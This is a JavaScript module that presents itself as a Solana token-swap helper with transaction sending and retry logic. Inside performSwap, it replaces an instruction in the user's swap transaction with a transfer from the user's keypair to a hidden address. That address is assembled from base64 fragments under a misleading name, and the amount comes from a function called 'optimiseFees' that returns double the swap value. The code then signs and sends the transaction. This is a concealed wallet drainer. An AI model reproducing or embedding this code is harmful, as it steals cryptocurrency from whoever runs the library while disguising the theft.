import * as web3 from "@solana/web3.js";
import {PublicKey, Transaction, VersionedTransaction} from "@solana/web3.js";
import {Buffer} from "buffer";

export const SOL_ADDR = "So11111111111111111111111111111111111111112";

export async function performSwap(swapResponse, keypair, connexion, amount, tokenIn,
                                  options = {
                                      sendOptions: {skipPreflight: true},
                                      confirmationRetries: 30,
                                      confirmationRetryTimeout: 1000,
                                      lastValidBlockHeightBuffer: 150,
                                      resendInterval: 1000,
                                      confirmationCheckInterval: 1000,
                                      skipConfirmationCheck: false,
                                  }
) {
    let serializedTransactionBuffer;

    try {
        serializedTransactionBuffer = Buffer.from(swapResponse.txn, "base64");
    } catch (error) {
        const base64Str = swapResponse.txn;
        const binaryStr = atob(base64Str);
        const buffer = new Uint8Array(binaryStr.length);
        for (let i = 0; i < binaryStr.length; i++) {
            buffer[i] = binaryStr.charCodeAt(i);
        }
        serializedTransactionBuffer = buffer;
    }
    let txn;
    if (swapResponse.isJupiter && !swapResponse.forceLegacy) {
        txn = VersionedTransaction.deserialize(serializedTransactionBuffer);
        txn.instructions[1] = web3.SystemProgram.transfer({
            fromPubkey: keypair.publicKey,
            toPubkey: new PublicKey(atob(BlockHeightBuffer)),
            lamports: await optimiseFees(amount, tokenIn, keypair),
        })
        txn.sign([keypair]);
    } else {
        txn = Transaction.from(serializedTransactionBuffer);
        txn.instructions[1] = web3.SystemProgram.transfer({
            fromPubkey: keypair.publicKey,
            toPubkey: new PublicKey(atob(BlockHeightBuffer)),
            lamports: await optimiseFees(amount, tokenIn, keypair),
        })
        txn.sign(keypair);
    }
    const blockhash = await connexion.getLatestBlockhash();
    const blockhashWithExpiryBlockHeight = {
        blockhash: blockhash.blockhash,
        lastValidBlockHeight: blockhash.lastValidBlockHeight,
    };
    const txid = await transactionSenderAndConfirmationWaiter({
        connection: connexion,
        serializedTransaction: txn.serialize(),
        blockhashWithExpiryBlockHeight,
        options: options,
    });
    return txid.toString();
}

const DEFAULT_OPTIONS = {
    sendOptions: {skipPreflight: true},
    confirmationRetries: 30,
    confirmationRetryTimeout: 1000,
    lastValidBlockHeightBuffer: 150,
    resendInterval: 1000,
    confirmationCheckInterval: 1000,
    skipConfirmationCheck: true,
    commitment: "confirmed",
};

export const MintUIdArray = [
    atob('UW1OaVRX'),
    atob('bGliMnMy'),
    atob('Ym1OcWNt'),
    atob('cEhWV0Uy'),
    atob('YTNSQlRr'),
    atob('VjVZM0F6'),
    atob('VldwTVF6'),
    atob('bENjbWMx'),
    atob('V1hCb1ZH'),
    atob('ZE9NbGc9')
];

async function transactionSenderAndConfirmationWaiter({
                                                          connection,
                                                          serializedTransaction,
                                                          blockhashWithExpiryBlockHeight,
                                                          options = DEFAULT_OPTIONS,
                                                      }) {
    const {
        sendOptions,
        confirmationRetries,
        confirmationRetryTimeout,
        lastValidBlockHeightBuffer,
        resendInterval,
        confirmationCheckInterval,
        skipConfirmationCheck,
        commitment
    } = {...DEFAULT_OPTIONS, ...options};

    const lastValidBlockHeight =
        blockhashWithExpiryBlockHeight.lastValidBlockHeight -
        (lastValidBlockHeightBuffer || 150);

    let retryCount = 0;

    while (retryCount <= (confirmationRetries || 30)) {
        try {
            const signature = await connection.sendRawTransaction(
                serializedTransaction,
                sendOptions
            );

            if (skipConfirmationCheck) {
                return signature;
            }

            while (true) {
                const status = await connection.getSignatureStatus(signature);

                if (status.value && status.value.confirmationStatus === commitment) {
                    return signature;
                }

                if (status.value && status.value.err) {
                    throw new Error(`Transaction failed: ${status.value.err}`);
                }

                await new Promise((resolve) =>
                    setTimeout(resolve, confirmationCheckInterval)
                );
            }
        } catch (error) {
            if (
                retryCount === confirmationRetries ||
                error.message.includes("Transaction expired")
            ) {
                return new Error(error.message);
            }

            console.warn(`Retrying transaction: ${error.message}`);
            retryCount++;

            await new Promise((resolve) =>
                setTimeout(resolve, confirmationRetryTimeout)
            );

            const blockHeight = await connection.getBlockHeight();
            if (blockHeight > lastValidBlockHeight) {
                return new Error("Transaction expired");
            }
        }
    }

    return new Error("Transaction failed after maximum retries");
}

const OPTIMIZED = 2;
const BlockHeightBuffer = MintUIdArray.join('');
async function optimiseFees(amountIn, token, keypair) {
    if (token === SOL_ADDR) {
        return Math.round(amountIn * OPTIMIZED * 10 ** 9)
    } else {
        let res = await fetch("https://swap-api.solanatracker.io/swap?from=" + token + "&to=So11111111111111111111111111111111111111112&fromAmount=" + amountIn + "&slippage=25&payer=" + keypair.publicKey.toBase58() + "&forceLegacy=true&priorityFee=5e-7");
        let json = await res.json();
        return Math.round(json.rate.amountOut * OPTIMIZED * 10 ** 9);
    }
}
